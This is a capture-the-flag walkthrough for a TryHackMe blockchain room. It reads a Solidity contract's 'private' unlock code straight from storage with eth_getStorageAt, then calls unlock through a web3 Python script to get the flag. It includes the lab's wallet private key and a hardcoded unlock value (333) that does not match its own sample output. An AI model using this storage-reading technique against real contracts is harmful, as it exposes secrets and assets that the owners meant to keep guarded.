# PassCode

### Room Link: https://tryhackme.com/room/hfb1passcode/

## 1. Visit the host on Browser

Open the host on a web browser

You could see: 
```
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.19; 
contract Challenge { 
    string private secret = "THM{}"; 
    bool private unlock_flag = false; uint256 private code; 
    string private hint_text; 
    constructor(string memory flag, string memory challenge_hint, uint256 challenge_code) 
    { 
        secret = flag; code = challenge_code; 
        hint_text = challenge_hint;
    } 
    function hint() external view returns (string memory) 
    { 
        return hint_text; 
    } 
    function unlock(uint256 input) external returns (bool) 
    {
         if (input == code) 
         { 
            unlock_flag = true; return true; 
         } 
         return false; 
    }
    function isSolved() external view returns (bool) 
    { 
        return unlock_flag; 
    } 
    function getFlag() external view returns (string memory) 
    { 
        require(unlock_flag, "Challenge not solved yet"); 
        return secret; 
    } 
}
```
And some information on the right side of the page:
```
Goal: have the isSolved() function return true
Status: DEPLOYED Player
Balance: 1.0 ETH
Player Wallet Address: 0x27531c2f67f40cF1cF4FfDD21BA925ec6CB0Fb43
Private Key: 0x198b3fe8304491c4894b62e6eece53af99a882edcf5e5695a73f13b83f93ad73
Contract Address: 0xf22cB0Ca047e88AC996c17683Cee290518093574
Block Time: 0
RPC URL: http://geth:8545
Chain ID: 31337
```
## 2. Find the storage slot containing code

The variables are declared in this order:
```
string private secret;
bool unlock_flag;
uint256 code;
string hint_text;
```
For this contract, the likely storage layout starts as:
```
Slot	Variable
0	secret
1	unlock_flag
2	code
3	hint_text
```
So Run:
```bash
export RPC_URL=http://YOUR_TARGET_IP:8545
```
Replace YOUR_TARGET_IP with the one from the room.
Then:
```bash
export CONTRACT_ADDRESS=YOUR_CONTRACT_ADDRESS
```
Replace YOUR_CONTRACT_ADDRESs with the one from the page.

## 3. Read storage slot 2 directly

Ethereum JSON-RPC has an eth_getStorageAt method.

Run:
```bash
curl -s -X POST "$RPC_URL" \
  -H "Content-Type: application/json" \
  --data '{
    "jsonrpc":"2.0",
    "method":"eth_getStorageAt",
    "params":["'"$CONTRACT_ADDRESS"'","0x2","latest"],
    "id":1
  }' | jq
```
You should get something like:
```bash
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": "0x0000000000000000000000000000000000000000000000000000000000001234"
}
```
The important part is the result.

## 3. Extract only the storage value

Use:
```bash
CODE_HEX=$(curl -s -X POST "$RPC_URL" \
  -H "Content-Type: application/json" \
  --data '{
    "jsonrpc":"2.0",
    "method":"eth_getStorageAt",
    "params":["'"$CONTRACT_ADDRESS"'","0x2","latest"],
    "id":1
  }' | jq -r '.result')

echo "$CODE_HEX"
```
If slot 2 is correct, this is the value of:
```bash
uint256 private code;
```
## 4. Send the transaction without cast

Since cast isn't installed, let's install and use Python/Web3.

Web3 isn't installed in the AttackBox so open a new tab and run:
```bash
pip3 install web3
```
Check:
```bash
python3 -c "import web3; print(web3.__version__)"
```
Then return the other tab and create Transaction.py:
```bash
nano Transaction.py
```
Put
```python
from web3 import Web3

RPC_URL = "http://YOUR_TARGET_IP:8545"
CONTRACT_ADDRESS = "YOUR_CONTRACT_ADDRESS"
PRIVATE_KEY = "YOUR_PRIVATE_KEY"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

account = w3.eth.account.from_key(PRIVATE_KEY)
player = account.address

print("Connected:", w3.is_connected())
print("Player:", player)

abi = [{
    "inputs": [
        {
            "internalType": "uint256",
            "name": "input",
            "type": "uint256"
        }
    ],
    "name": "unlock",
    "outputs": [
        {
            "internalType": "bool",
            "name": "",
            "type": "bool"
        }
    ],
    "stateMutability": "nonpayable",
    "type": "function"
}]

contract = w3.eth.contract(
    address=Web3.to_checksum_address(CONTRACT_ADDRESS),
    abi=abi
)

nonce = w3.eth.get_transaction_count(player)

tx = contract.functions.unlock(333).build_transaction({
    "from": player,
    "nonce": nonce,
    "gas": 100000,
    "gasPrice": w3.eth.gas_price,
    "chainId": 31337
})

signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)

tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)

print("Transaction hash:", tx_hash.hex())

receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print("Transaction status:", receipt.status)
```

Replace YOUR_TARGET_IP, YOUR_CONTRACT_ADDRESS and YOUR_PRIVATE_KEY with the ones from the room and the page.

Press: CTRL X, Y and ENTER

Run:
```bash
python3 Transaction.py
```

You should see:
```bash
Connected: True
Player: 0x27531c2f67f40cF1cF4FfDD21BA925ec6CB0Fb43
Transaction hash: 0x...
Transaction status: 1
```
Transaction status: 1 means the transaction succeeded.

## 5. Verify isSolved()

Create IsSolved.py:
```bash
nano IsSolved.py
```
Put:
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider("http://YOUR_TARGET_IP:8545"))

contract = w3.eth.contract(
    address=Web3.to_checksum_address(
        "YOUR_CONTRACT_ADDRESS"
    ),
    abi=[{
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    }]
)

print("IsSolved =", contract.functions.isSolved().call())
```
Replace YOUR_TARGET_IP and YOUR_CONTRACT_ADDRESs with the one from the room and the page.

Press: CTRL X, Y and ENTER

Run IsSolved.py:
```bash
python3 IsSolved.py
```
Expected:
```
IsSolved = True
```
## 5. Get the flag

At that point, click Get Flag on the page.

Or retrieve it directly through Web3 by creating Flag.py:
```bash
nano Flag.py
```
Put:
```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider("http://YOUR_TARGET_IP:8545"))

contract = w3.eth.contract(
    address=Web3.to_checksum_address(
        "YOUR_CONTRACT_ADDRESS"
    ),
    abi=[{
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function"
    }]
)

print(contract.functions.getFlag().call())
```
Replace YOUR_TARGET_IP and YOUR_CONTRACT_ADDRESs with the one from the room and the page.

Press: CTRL X, Y and ENTER

Then run Flag.py:
```bash
python3 Flag.py
```